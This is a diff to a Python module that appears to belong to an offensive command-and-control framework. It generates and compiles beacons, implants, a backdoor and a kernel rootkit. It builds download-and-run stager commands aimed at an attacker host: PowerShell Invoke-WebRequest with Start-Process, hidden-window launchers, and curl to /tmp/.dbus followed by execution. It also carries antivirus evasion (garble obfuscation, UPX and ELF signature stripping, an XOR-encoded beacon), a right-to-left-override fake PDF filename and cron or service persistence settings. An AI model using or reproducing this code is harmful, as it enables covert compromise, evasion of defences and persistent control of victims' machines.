@@ -11,15 +11,17 @@ import json
 import os
 import re
 import shutil
+import subprocess
 import tempfile
 import time
+from collections.abc import Callable
 from contextlib import contextmanager
 from dataclasses import dataclass, field
 from datetime import datetime
-from string import Template
-from typing import Any, Callable
+from pathlib import Path
+from typing import Any
 
-from core.console import CYAN, RED, RESET
+from core.config import load_payload
 from core.validators import check_lhost, check_lport
 from modules.metrics import REGISTRY
 from utils import (
@@ -34,8 +36,7 @@ from utils import (
 )
 
 _GO_CANDIDATE_PATHS = (
-    "/usr/local/go/bin/go",
-    os.path.expanduser("~/go/bin/go"),
+    str(Path.home() / "go" / "bin" / "go"),
     "/usr/bin/go",
     "/usr/local/bin/go",
 )
@@ -161,16 +162,256 @@ def _preflight(profile: C2Profile) -> bool:
     """Check that all required external binaries are present."""
     missing = [t for t in profile.required_tools if not is_binary_present(t)]
     if missing:
-        print_error(
-            f"Missing required tools for {profile.name}: {', '.join(missing)}"
-        )
+        print_error(f"Missing required tools for {profile.name}: {', '.join(missing)}")
         return False
     return True
 
 
 def _render_template(content: str, context: dict[str, Any]) -> str:
-    """Render a template using ``string.Template`` (safe substitution)."""
-    return Template(content).safe_substitute(context)
+    """Render a template by replacing {key} placeholders with context values."""
+    import re
+
+    def _replacer(match: re.Match) -> str:
+        key = match.group(1)
+        return str(context.get(key, match.group(0)))
+
+    return re.sub(r"\{([a-zA-Z_]\w*)\}", _replacer, content)
+
+
+def _resolve_fallback_urls(params: dict[str, Any]) -> list[str]:
+    """Collect disposable redirector URLs for the Go beacon fallback list.
+
+    Sources, in order: ``c2_fallback_urls`` param (list or comma string),
+    ``sessions/redirectors.json`` state, and ``cf.log`` quick-tunnel URLs.
+
+    Args:
+        params: Live shell params dict.
+
+    Returns:
+        Deduplicated fallback URL list.
+    """
+    urls: list[str] = []
+    raw = params.get("c2_fallback_urls", "")
+    if isinstance(raw, list):
+        urls.extend(str(u).strip() for u in raw if str(u).strip())
+    elif isinstance(raw, str) and raw.strip():
+        urls.extend(u.strip() for u in raw.split(",") if u.strip())
+    try:
+        state_path = Path("sessions/redirectors.json")
+        if state_path.exists():
+            state = json.loads(state_path.read_text(encoding="utf-8"))
+            for entry in state.get("redirectors", []):
+                url = str(entry.get("url", "")).strip()
+                if url and url not in urls:
+                    urls.append(url)
+    except (OSError, json.JSONDecodeError):
+        pass
+    try:
+        cf_log = Path("cf.log")
+        if cf_log.exists():
+            content = cf_log.read_text(encoding="utf-8", errors="replace")
+            for match in re.findall(r"https://[-0-9a-z]+\.trycloudflare\.com", content):
+                if match not in urls:
+                    urls.append(match)
+    except OSError:
+        pass
+    return urls
+
+
+def _go_string_list(urls: list[str]) -> str:
+    """Format URLs as a Go string slice body.
+
+    Args:
+        urls: URL list.
+
+    Returns:
+        Go source fragment like ``"a", "b"`` or ``""`` when empty.
+    """
+    if not urls:
+        return '""'
+    return ", ".join(f'"{u}"' for u in urls)
+
+
+_DEFAULT_SCAN_PORTS: tuple[int, ...] = (22, 80, 443, 445, 3389, 8080, 8443)
+
+
+def _lkm_makefile_text(listener_ip: str, listener_port: str) -> str:
+    """Render the LKM rootkit Makefile with per-deployment listener values.
+
+    Args:
+        listener_ip: Target-attached reverse-connect address.
+        listener_port: Reverse-connect port.
+
+    Returns:
+        kbuild Makefile text overriding the guarded rootkit defaults.
+    """
+    return (
+        "obj-m += rootkit.o\n"
+        "\n"
+        f'LISTENER_IP ?= {listener_ip}\n'
+        f'LISTENER_PORT ?= {listener_port}\n'
+        "HIDDEN_PROCESS_NAME ?= rootkit_proc\n"
+        "HIDDEN_FILE_NAME ?= rootkit_file\n"
+        "SPECIAL_STRING ?= knoires-lz\n"
+        "SPECIAL_STRING_PORT ?= 4444\n"
+        "\n"
+        "ccflags-y += \\\n"
+        '\t-DLISTENER_IP=\\"$(LISTENER_IP)\\" \\\n'
+        "\t-DLISTENER_PORT=$(LISTENER_PORT) \\\n"
+        '\t-DHIDDEN_PROCESS_NAME=\\"$(HIDDEN_PROCESS_NAME)\\" \\\n'
+        '\t-DHIDDEN_FILE_NAME=\\"$(HIDDEN_FILE_NAME)\\" \\\n'
+        '\t-DSPECIAL_STRING=\\"$(SPECIAL_STRING)\\" \\\n'
+        "\t-DSPECIAL_STRING_PORT=$(SPECIAL_STRING_PORT)\n"
+        "\n"
+        "all:\n"
+        "\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n"
+        "\n"
+        "clean:\n"
+        "\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n"
+    )
+
+
+def _beacon_scan_ports_csv(params: dict[str, Any]) -> str:
+    """Resolve the beacon discovery port list as a CSV string.
+
+    Args:
+        params: Payload parameters backing the beacon build.
+
+    Returns:
+        Comma-separated port numbers matching the beacon config builder.
+    """
+    try:
+        from modules.beacon_config_builder import BeaconConfigBuilder
+
+        return ",".join(str(port) for port in BeaconConfigBuilder(params).build().beacon_scan_ports)
+    except Exception:
+        return ",".join(str(port) for port in _DEFAULT_SCAN_PORTS)
+
+
+def _parse_go_version(text: str) -> tuple[int, int, int] | None:
+    """Parse a ``go version`` output line into a version triple.
+
+    Args:
+        text: Raw output such as ``go version go1.26.5 linux/amd64``.
+
+    Returns:
+        ``(major, minor, patch)`` triple, or None when unparseable.
+    """
+    match = re.search(r"go(\d+)\.(\d+)(?:\.(\d+))?", text or "")
+    if not match:
+        return None
+    return (int(match.group(1)), int(match.group(2)), int(match.group(3) or 0))
+
+
+def _command_output(argv: list[str], timeout: int = 30) -> str | None:
+    """Run a command in list form and return stripped stdout.
+
+    Args:
+        argv: Argument vector, never a shell string.
+        timeout: Seconds before aborting.
+
+    Returns:
+        Stripped stdout on success, None on any failure.
+    """
+    try:
+        result = subprocess.run(argv, capture_output=True, text=True, timeout=timeout, check=False)
+    except (OSError, subprocess.TimeoutExpired):
+        return None
+    if result.returncode != 0:
+        return None
+    return (result.stdout or "").strip()
+
+
+def _go_build_version(go_bin: str, target: str) -> tuple[int, int, int] | None:
+    """Report the Go toolchain version that built a binary.
+
+    Uses ``go version <file>``, which prints the compiler version stamped
+    into the binary at build time.
+
+    Args:
+        go_bin: Go binary used to query.
+        target: Binary to inspect (``go`` itself or ``garble``).
+
+    Returns:
+        Version triple, or None when it cannot be determined.
+    """
+    output = _command_output([go_bin, "version", target])
+    if not output:
+        return None
+    return _parse_go_version(output)
+
+
+def _garble_matches_toolchain(go_bin: str, garble_bin: str) -> bool:
+    """Check whether garble was built with the current Go toolchain.
+
+    A stale garble aborts every build with ``was built with ... can't be
+    used with the newer ...``. Go enforces an exact toolchain match, so the
+    full triple is compared before the build starts.
+
+    Args:
+        go_bin: Current Go binary.
+        garble_bin: Garble binary to validate.
+
+    Returns:
+        True when versions match exactly or cannot be determined.
+    """
+    current = _command_output([go_bin, "version"])
+    built_with = _command_output([go_bin, "version", garble_bin])
+    current_v = _parse_go_version(current or "")
+    built_v = _parse_go_version(built_with or "")
+    if current_v is None or built_v is None:
+        return True
+    return current_v == built_v
+
+
+def _build_compile_commands(
+    sessions_dir: str,
+    profile: Any,
+    gocompiler: str,
+    compile_flags: str,
+    main_out: str,
+    main_src: str,
+    listener_out: str,
+    listener_src: str,
+    monitor_out: str,
+    monitor_src: str,
+) -> tuple[str, str, str]:
+    """Build the three Go compile commands for the beacon pipeline.
+
+    Every command is prefixed with ``cd <sessions> &&`` so the shell
+    dispatcher routes it through ``bash -c``. A bare ``CGO_ENABLED=0 ...``
+    prefix would otherwise be split as an argv and fail with
+    ``FileNotFoundError: 'CGO_ENABLED=0'``.
+
+    Args:
+        sessions_dir: Sessions directory for the build working copy.
+        profile: Target platform profile with goos/goarch/cc/cgo/loader.
+        gocompiler: Compiler command prefix (garble or plain go).
+        compile_flags: ldflags fragment.
+        main_out: Output path of the main beacon binary.
+        main_src: Main beacon source file.
+        listener_out: Output path of the listener binary.
+        listener_src: Listener source file.
+        monitor_out: Output path of the monitor binary.
+        monitor_src: Monitor source file.
+
+    Returns:
+        Tuple of (main, listener, monitor) shell commands.
+    """
+    cc = f"CC={profile.cc} " if profile.cc else ""
+    main_cmd = (
+        f"cd {sessions_dir} && CGO_ENABLED={profile.cgo} {cc}GOOS={profile.goos} GOARCH={profile.goarch} "
+        f"{gocompiler} {compile_flags} -o {main_out} {main_src} {profile.loader}"
+    )
+    listener_cmd = (
+        f"cd {sessions_dir} && CGO_ENABLED=0 GOOS={profile.goos} GOARCH={profile.goarch} "
+        f"{gocompiler} {compile_flags} -o {listener_out} {listener_src}"
+    )
+    monitor_cmd = (
+        f"cd {sessions_dir} && CGO_ENABLED=0 GOOS={profile.goos} GOARCH={profile.goarch} "
+        f"{gocompiler} {compile_flags} -o {monitor_out} {monitor_src}"
+    )
+    return main_cmd, listener_cmd, monitor_cmd
 
 
 @contextmanager
@@ -226,44 +467,99 @@ class C2Builder:
         self.c2_user = c2_user
         self.c2_pass = c2_pass
 
+    def _ensure_garble_toolchain(self, go_bin: str, garble_bin: str, gocompiler: str, profile: Any) -> str:
+        """Validate the Go toolchain before compiling and repair it.
+
+        Checks that garble exists, was built with the current Go release
+        (a stale garble aborts with ``can't be used with the newer ...``),
+        and that a C compiler is available when the profile needs CGO.
+        A stale garble is reinstalled automatically; when repair fails the
+        build falls back to plain ``go build`` instead of aborting.
+
+        Args:
+            go_bin: Resolved Go binary.
+            garble_bin: Resolved garble binary path.
+            gocompiler: Current compiler command prefix.
+            profile: Target platform profile.
+
+        Returns:
+            Usable compiler command prefix.
+        """
+        if "garble" not in gocompiler:
+            return gocompiler
+        if not os.path.isfile(garble_bin):
+            print_warn(f"Garble not found at {garble_bin}, falling back to plain go build.")
+            return f"{go_bin} build"
+        if not _garble_matches_toolchain(go_bin, garble_bin):
+            print_msg(f"Garble at {garble_bin} is stale for the current Go release, reinstalling ...")
+            self.cmd(f"{go_bin} install mvdan.cc/garble@latest")
+            self.cmd("sleep 2")
+            refreshed = shutil.which("garble") or os.path.expanduser("~/go/bin/garble")
+            if os.path.isfile(refreshed) and _garble_matches_toolchain(go_bin, refreshed):
+                return f"{refreshed} -literals -tiny build "
+            print_warn("Garble reinstall did not fix the toolchain mismatch, falling back to plain go build.")
+            return f"{go_bin} build"
+        if str(getattr(profile, "cgo", "0")) == "1":
+            cc = getattr(profile, "cc", "") or "gcc"
+            if not shutil.which(cc):
+                print_warn(
+                    f"C compiler '{cc}' not found but the {profile.goos} profile needs CGO. Install gcc to avoid a build failure."
+                )
+        return gocompiler
+
     def run(self, line: str, choice: str | None, use_tunnel: bool) -> dict[str, Any]:
         """Execute the full C2 build pipeline.
 
         Returns a dict with build artefacts and metadata so the caller can
         update shell state (``c2_url``, ``c2_clientid``, ``c2_auth``).
         """
+        from core.session_secrets import ensure_session_secrets
+
         start_time = time.monotonic()
         path = os.getcwd()
         lport_param = str(self.params["c2_port"])
+        ensure_session_secrets(rotate=False)
 
         if use_tunnel:
-            tunnel_cmd = """link=$(grep -o 'https://[-0-9a-z]*\\.trycloudflare.com' "cf.log")
-echo "Cloudflare Tunnel URL: $link"
-"""
-            os.system(tunnel_cmd)
-            lhost = input(
-                "Enter your Cloudflare tunnel subdomain (e.g., yoursubdomain.trycloudflare.com): "
-            ).strip()
+            tunnel_url = ""
+            try:
+                cf_log = Path("cf.log")
+                if cf_log.exists():
+                    cf_content = cf_log.read_text(encoding="utf-8", errors="replace")
+                    match = re.search(r"https://[-0-9a-z]+\.trycloudflare\.com", cf_content)
+                    if match:
+                        tunnel_url = match.group(0)
+            except OSError:
+                pass
+            if tunnel_url:
+                print(f"Cloudflare Tunnel URL: {tunnel_url}")
+            lhost = input("Enter your Cloudflare tunnel subdomain (e.g., yoursubdomain.trycloudflare.com): ").strip()
             lport = "443"
         else:
             lhost = self.params["lhost"]
             lport = lport_param
 
+        rhost = self.params.get("rhost", lhost)
         rport = str(self.params["rport"])
         listener = str(self.params["listener"])
         sleep = str(self.params["sleep"])
-        maleable = self.params["c2_maleable_route"]
+        malleable = self.params["c2_malleable_route"]
         user_agent_win = self.params["user_agent_win"]
         user_agent_lin = self.params["user_agent_lin"]
         user_agent_1 = self.params["user_agent_1"]
         user_agent_2 = self.params["user_agent_2"]
         user_agent_3 = self.params["user_agent_3"]
-        url_trafic_1 = self.params["url_trafic_1"]
-        url_trafic_2 = self.params["url_trafic_2"]
-        url_trafic_3 = self.params["url_trafic_3"]
+        url_traffic_1 = self.params["url_traffic_1"]
+        url_traffic_2 = self.params["url_traffic_2"]
+        url_traffic_3 = self.params["url_traffic_3"]
         random_bytes = os.urandom(100)
         random_string = base64.b64encode(random_bytes).decode("utf-8")[:12]
         working_dir = f"{path}/sessions/"
+
+        use_ssl = os.path.exists("cert.pem") and os.path.exists("key.pem")
+        protocol = "https" if use_ssl else "http"
+        curl_flags = "-k" if use_ssl else ""
+        psh_flags = " -SkipCertificateCheck" if use_ssl else ""
 
         if not choice:
             choice = (
@@ -287,14 +583,20 @@ echo "Cloudflare Tunnel URL: $link"
 
         if choice == "1":
             payload = (
-                f"powershell -c \"Invoke-WebRequest 'http://{lhost}/stub.exe' "
-                f"-OutFile 'stub.exe'; Start-Process 'stub.exe'\""
+                f"powershell -c \"Invoke-WebRequest '{protocol}://{lhost}:{lport}/s/stub.exe' "
+                f"-OutFile 'stub.exe'{psh_flags}; Start-Process 'stub.exe'\""
             )
             print_msg(payload)
             self.onecmd(f"encodewinbase64 {payload}")
             user_agent = user_agent_win
         elif choice == "2":
-            payload = f"""curl http://{lhost}/stub -o /tmp/stub && \
+            if use_ssl:
+                payload = (
+                    f"curl {curl_flags} {protocol}://{lhost}:{lport}/s/{line} -o /tmp/.dbus && "
+                    f"chmod +x /tmp/.dbus && /tmp/.dbus"
+                )
+            else:
+                payload = f"""curl {protocol}://{lhost}:{lport}/s/stub -o /tmp/stub && \
 [ -s /tmp/stub ] && \
 chmod +x /tmp/stub && \
 /tmp/stub""".replace("            ", "")
@@ -302,17 +604,15 @@ chmod +x /tmp/stub && \
             copy2clip(cmd)
             user_agent = user_agent_lin
         elif choice == "3":
-            payload = (
-                f"powershell iwr -uri  http://{lhost}/batrat.bat -OutFile batrat.bat ; .\\batrat.bat"
-            )
+            payload = f"powershell iwr -uri  {protocol}://{lhost}:{lport}/s/batrat.bat -OutFile batrat.bat{psh_flags} ; .\\batrat.bat"
             copy2clip(payload)
             user_agent = user_agent_win
         elif choice == "4":
-            payload = f"curl http://{lhost}/r -o r && sh r"
+            payload = f"curl {curl_flags} {protocol}://{lhost}:{lport}/s/r -o r && sh r"
             copy2clip(payload)
             user_agent = user_agent_win
         elif choice in ("5", "6", "7"):
-            payload = f"curl http://{lhost}/r -o r && sh r"
+            payload = f"curl {curl_flags} {protocol}://{lhost}:{lport}/s/r -o r && sh r"
             copy2clip(payload)
             user_agent = user_agent_lin
         else:
@@ -328,15 +628,24 @@ chmod +x /tmp/stub && \
             return {}
 
         go_bin = _ensure_go(self.cmd)
-        if not is_binary_present("garble"):
-            self.cmd(f"{go_bin} install github.com/burrowers/garble@latest")
+        garble_installed = is_binary_present("garble") or (os.path.isfile(os.path.expanduser("~/go/bin/garble")))
+        if not garble_installed:
+            self.cmd(f"{go_bin} install mvdan.cc/garble@latest")
+            self.cmd("sleep 2")
             garble_bin = shutil.which("garble") or os.path.expanduser("~/go/bin/garble")
-            gocompiler = f"{go_bin} build"
+            if os.path.isfile(garble_bin if isinstance(garble_bin, str) else str(garble_bin)):
+                gocompiler = f"{garble_bin} -literals -tiny build "
+            else:
+                gocompiler = f"{go_bin} build"
         else:
-            garble_bin = shutil.which("garble") or "garble"
+            garble_bin = shutil.which("garble") or os.path.expanduser("~/go/bin/garble")
             gocompiler = f"{garble_bin} -literals -tiny build "
+        gocompiler = self._ensure_garble_toolchain(go_bin, str(garble_bin), gocompiler, profile)
 
         file = f"{path}/modules/run"
+        os.makedirs(f"{path}/sessions/win", exist_ok=True)
+        os.makedirs(f"{path}/sessions/lin", exist_ok=True)
+        os.makedirs(f"{path}/sessions/implant", exist_ok=True)
         wfile = f"{path}/sessions/win/lazybot.ps1"
         bfile = f"{path}/modules/run.bat"
         filek = f"{path}/modules/backdoor/backdoor.c"
@@ -373,33 +682,56 @@ chmod +x /tmp/stub && \
             "password": self.c2_pass,
             "platform": platform,
             "sleep": sleep,
-            "maleable": maleable,
+            "malleable": malleable,
+            "maleable": malleable,  # alias for Go source typo {maleable}
+            "protocol": protocol,
             "useragent": user_agent,
             "key": aes_key_hex,
+            "rat_key": str(load_payload().get("rat_key", "") or ""),
+            "session_magic": str(load_payload().get("session_magic", "") or ""),
+            "rhost": str(self.params.get("rhost", "") or ""),
+            "sleep_jit_enabled": str(self.params.get("sleep_jit_enabled", "True")),
+            "sleep_jit_pct_min": str(self.params.get("sleep_jit_pct_min", "30")),
+            "sleep_jit_pct_max": str(self.params.get("sleep_jit_pct_max", "60")),
+            "sleep_activation_delay_min": str(self.params.get("sleep_activation_delay_min", "0s")),
+            "sleep_activation_delay_max": str(self.params.get("sleep_activation_delay_max", "0s")),
+            "persistence_cron_schedule": str(self.params.get("persistence_cron_schedule", "*/5 * * * *")),
+            "persistence_service_name": str(self.params.get("persistence_service_name", "sysmaint")),
+            "reverse_shell_port": str(self.params.get("reverse_shell_port", "") or ""),
+            "beacon_scan_ports": _beacon_scan_ports_csv(self.params),
             "stealth": "True",
             "user_agent_1": user_agent_1,
             "user_agent_2": user_agent_2,
             "user_agent_3": user_agent_3,
-            "url_trafic_1": url_trafic_1,
-            "url_trafic_2": url_trafic_2,
-            "url_trafic_3": url_trafic_3,
+            "url_traffic_1": url_traffic_1,
+            "url_traffic_2": url_traffic_2,
+            "url_traffic_3": url_traffic_3,
             "listener": listener,
+            "c2_fallback_urls": _go_string_list(_resolve_fallback_urls(self.params)),
         }
 
         def _read(path_: str) -> str:
+            try:
+                with open(path_, "r") as f:
+                    return f.read()
+            except FileNotFoundError:
+                return ""
+
+        def _read_required(path_: str) -> str:
             with open(path_, "r") as f:
                 return f.read()
 
         def _write(path_: str, content: str) -> None:
+            os.makedirs(os.path.dirname(path_) or ".", exist_ok=True)
             with open(path_, "w+") as f:
                 f.write(content)
 
-        content = _render_template(_read(file), ctx)
+        content = _render_template(_read_required(file), ctx)
         wcontent = _render_template(_read(wfile), ctx)
         bcontent = _render_template(_read(bfile), ctx)
         cwcontent = _render_template(_read(cwfiles), ctx)
         content_mon = _render_template(_read(cfiles), ctx)
-        evil_content = _render_template(_read(file_evil), ctx)
+        _render_template(_read(file_evil), ctx)
         payload_content = _render_template(_read(payload_sh), ctx)
         rootkit_content = _render_template(_read(rootkit_c), ctx)
         mrhyde_content = _render_template(_read(mrhyde), ctx)
@@ -416,6 +748,16 @@ chmod +x /tmp/stub && \
         backdoor_content = _render_template(_read(filek), ctx)
         _write("sessions/b.c", backdoor_content)
 
+        lkm_rootkit = f"{path}/modules/rootkit/rootkit.c"
+        if os.path.isfile(lkm_rootkit):
+            lkm_target = str(self.params.get("rhost", lhost))
+            lkm_content = _render_template(_read(lkm_rootkit), {**ctx, "lhost": lkm_target})
+            _write(f"{path}/sessions/rootkit_lkm.c", lkm_content)
+            _write(
+                f"{path}/sessions/rootkit_Makefile",
+                _lkm_makefile_text(lkm_target, str(self.params.get("rport", "3333"))),
+            )
+
         server_content = _render_template(_read(files), {**ctx, "lhost": rhost})
         _write("sessions/server.c", server_content)
 
@@ -423,7 +765,7 @@ chmod +x /tmp/stub && \
         _write(f"sessions/listener_{line}.sh", listener_content)
 
         print_msg(
-            f"curl -o l_{line} http://{lhost}/listener_{line}.sh ; chmod +x l_{line}.sh ; ./l_{line}.sh &"
+            f"curl -o l_{line} {curl_flags} {protocol}://{lhost}:{lport}/s/listener_{line}.sh ; chmod +x l_{line}.sh ; ./l_{line}.sh &"
         )
 
         rcontent = _render_template(_read(filer), ctx)
@@ -463,20 +805,17 @@ chmod +x /tmp/stub && \
             rsrc_bin = shutil.which("rsrc") or os.path.expanduser("~/go/bin/rsrc")
             self.cmd(f"{rsrc_bin} -ico static/pdf.ico -o sessions/icon.syso")
 
-        cc = f"CC={profile.cc} " if profile.cc else ""
-        cgo = f"CGO_ENABLED={profile.cgo} "
-
-        compile_command = (
-            f"cd {self.sessions_dir} && {cgo}{cc}GOOS={profile.goos} GOARCH={profile.goarch} "
-            f"{gocompiler} {compile_flags} -o {implantgo} {implant_go} {profile.loader}"
-        )
-        compile_command2 = (
-            f"CGO_ENABLED=0 GOOS={profile.goos} GOARCH={profile.goarch} "
-            f"{gocompiler} {compile_flags} -o {implantgo2} {implant_go2}"
-        )
-        compile_command4 = (
-            f"CGO_ENABLED=0 GOOS={profile.goos} GOARCH={profile.goarch} "
-            f"{gocompiler} {compile_flags} -o sessions/monrevlin {monrevlin}"
+        compile_command, compile_command2, compile_command4 = _build_compile_commands(
+            self.sessions_dir,
+            profile,
+            gocompiler,
+            compile_flags,
+            implantgo,
+            implant_go,
+            implantgo2,
+            implant_go2,
+            f"{self.sessions_dir}/monrevlin",
+            monrevlin,
         )
 
         self.cmd(compile_command)
@@ -492,16 +831,14 @@ chmod +x /tmp/stub && \
             self.cmd(cplib)
             self.onecmd(f"service {line}")
             self.onecmd(f"service l_{line}")
-            ofuscate = (
-                "cd sessions && base64 payload.sh | (echo -n '#!/bin/bash\\necho \"' ; cat - ; echo '\" | base64 -d | bash') | sponge payload.sh"
-            )
+            ofuscate = "cd sessions && base64 payload.sh | (echo -n '#!/bin/bash\\necho \"' ; cat - ; echo '\" | base64 -d | bash') | sponge payload.sh"
             self.cmd(ofuscate)
-            curl_payload = f"curl -o payload.sh http://{lhost}/payload.sh ; chmod +x payload.sh ; ./payload.sh "
+            curl_payload = f"curl -o payload.sh {curl_flags} {protocol}://{lhost}:{lport}/s/payload.sh ; chmod +x payload.sh ; ./payload.sh "
             print_msg(curl_payload)
 
             with open("sessions/implant/stub_lin.c", "r") as f:
                 stub = f.read()
-            stub = _render_template(stub, {"lhost": lhost})
+            stub = _render_template(stub, {"lhost": lhost, "lport": lport})
             _write("sessions/stub.c", stub)
             self.cmd("gcc -o sessions/stub sessions/stub.c -lcurl && upx sessions/stub")
 
@@ -509,17 +846,17 @@ chmod +x /tmp/stub && \
             compile_cw = f"x86_64-w64-mingw32-gcc -o sessions/b{line}.exe sessions/wmr.c -lws2_32 -lwininet"
             command_mrhyde = f"x86_64-w64-mingw32-gcc -shared -o {path}/sessions/mrhyde.dll {path}/sessions/mrhydew.c -lkernel32 -luser32 -ladvapi32"
             print_msg(
-                f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  http://{lhost}/{implant_go} -OutFile {implant_go} ; .\\{implant_go}`""'
+                f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  {protocol}://{lhost}:{lport}/s/{implant_go} -OutFile {implant_go}{psh_flags} ; .\\{implant_go}`""'
             )
             print_msg(
-                f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  http://{lhost}/{implant_go2} -OutFile {implant_go2} ; .\\{implant_go2}`""'
+                f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  {protocol}://{lhost}:{lport}/s/{implant_go2} -OutFile {implant_go2}{psh_flags} ; .\\{implant_go2}`""'
             )
             print_msg(
-                f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  http://{lhost}/b{line}.exe -OutFile b{line}.exe ; .\\b{line}.exe`""'
+                f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  {protocol}://{lhost}:{lport}/s/b{line}.exe -OutFile b{line}.exe{psh_flags} ; .\\b{line}.exe`""'
             )
             with open("sessions/implant/stub.c", "r") as f:
                 stub = f.read()
-            stub = _render_template(stub, {"lhost": lhost})
+            stub = _render_template(stub, {"lhost": lhost, "lport": lport})
             _write("sessions/stub.c", stub)
             self.cmd(
                 "x86_64-w64-mingw32-gcc -o sessions/stub.exe sessions/stub.c -lwininet -ladvapi32 -s -Os -static -fno-stack-protector -lcrypt32 && upx sessions/stub.exe"
@@ -535,12 +872,12 @@ chmod +x /tmp/stub && \
         if platform == "linux":
             for target in (line, "monrev"):
                 cmd_anti_upx = (
-                    'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})UPX!.{4}/$1$2\\0\\0\\0\\0\\0\\0\\0\\0/s\' "'
+                    "cd sessions ; perl -i -0777 -pe 's/^(.{64})(.{0,256})UPX!.{4}/$1$2\\0\\0\\0\\0\\0\\0\\0\\0/s' \""
                     + target
                     + '"'
                 )
                 cmd_ant_elf = (
-                    'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})\\x7fELF/$1$2\\0\\0\\0\\0/s\' "'
+                    "cd sessions ; perl -i -0777 -pe 's/^(.{64})(.{0,256})\\x7fELF/$1$2\\0\\0\\0\\0/s' \""
                     + target
                     + '"'
                 )
@@ -549,32 +886,22 @@ chmod +x /tmp/stub && \
 
         elif platform == "windows":
             newname = (
-                self.sessions_dir
-                + "/"
-                + binary.split(".")[0]
-                + "\u202e"
-                + ".pdfx"[::-1]
-                + binary.split(".")[1]
+                self.sessions_dir + "/" + binary.split(".")[0] + "\u202e" + ".pdfx"[::-1] + binary.split(".")[1]
             ).encode("utf-8")
             print_msg("New Camuflage File " + str(newname))
             shutil.copy(file, newname)
 
         # --- Beacon encryption ---
-        encbeacon = f"""
-python3 -c "
-import base64
-with open('sessions/{binary}', 'rb') as f:
-    data = f.read()
-    xor_data = bytes([b ^ 0x33 for b in data])
-    b64_data = base64.b64encode(xor_data)
-with open('sessions/beacon.enc', 'wb') as f:
-    f.write(b64_data)
-"
-""".replace(
-            "        ", ""
-        )
-        self.toastr(f"Executing... {encbeacon}", type="info")
-        os.system(encbeacon)
+        self.toastr(f"Encrypting beacon {binary}...", type="info")
+        src_path = Path(self.sessions_dir) / binary
+        enc_path = Path(self.sessions_dir) / "beacon.enc"
+        try:
+            data = src_path.read_bytes()
+            xor_data = bytes([b ^ 0x33 for b in data])
+            b64_data = base64.b64encode(xor_data)
+            enc_path.write_bytes(b64_data)
+        except OSError as exc:
+            print_msg(f"Beacon encryption failed: {exc}")
         print_msg(f"Go agent {implantgo} compiled successfully.")
 
         # --- MD5 ---
@@ -586,14 +913,14 @@ with open('sessions/beacon.enc', 'wb') as f:
             "id": random_string,
             "name": line,
             "binary": f"{path}/sessions/{binary}",
-            "url_binary": f"http://{lhost}/{binary}",
+            "url_binary": f"{protocol}://{lhost}:{lport}/s/{binary}",
             "os_id": choice,
             "os": platform,
             "rhost": self.params["rhost"],
             "log": f"{line}.log",
             "user_agent": user_agent,
-            "maleable_route": maleable,
-            "url": f"https://{lhost}:{lport}",
+            "malleable_route": malleable,
+            "url": f"{protocol}://{lhost}:{lport}",
             "sleep": sleep,
             "username": self.c2_user,
             "password": self.c2_pass,
@@ -611,16 +938,24 @@ with open('sessions/beacon.enc', 'wb') as f:
         else:
             with open(json_file, "r") as f:
                 short_urls = json.load(f)
-        if line in short_urls:
-            print_warn(f"Entry '{line}' already exists in short urls")
-        short_urls[line] = {
-            "original_url": f"https://{lhost}/s/{binary}",
-            "active": True,
-            "created_at": datetime.now().isoformat(),
+
+        _payloads_to_register = {
+            line: f"/s/{binary}",
+            "stub": "/s/stub",
+            "beacon.enc": "/s/beacon.enc",
+            "r": "/s/r",
         }
+        for short_name, target_path in _payloads_to_register.items():
+            if short_name in short_urls:
+                print_warn(f"Entry '{short_name}' already exists in short urls")
+            short_urls[short_name] = {
+                "original_url": f"{protocol}://{lhost}{target_path}",
+                "active": True,
+                "created_at": datetime.now().isoformat(),
+            }
         with open(json_file, "w") as f:
             json.dump(short_urls, f, indent=2)
-        print_msg(f"Created new entry for '{line}' in shorts urls")
+        print_msg("Created entries in shorts urls")
 
         # --- C2 server ---
         self.onecmd("create_session_json")
@@ -634,7 +969,7 @@ with open('sessions/beacon.enc', 'wb') as f:
         )
 
         result = {
-            "c2_url": f"https://{lhost}:{lport}",
+            "c2_url": f"{protocol}://{lhost}:{lport}",
             "c2_clientid": line.strip(),
             "c2_auth": (self.c2_user, self.c2_pass),
             "lhost": lhost,
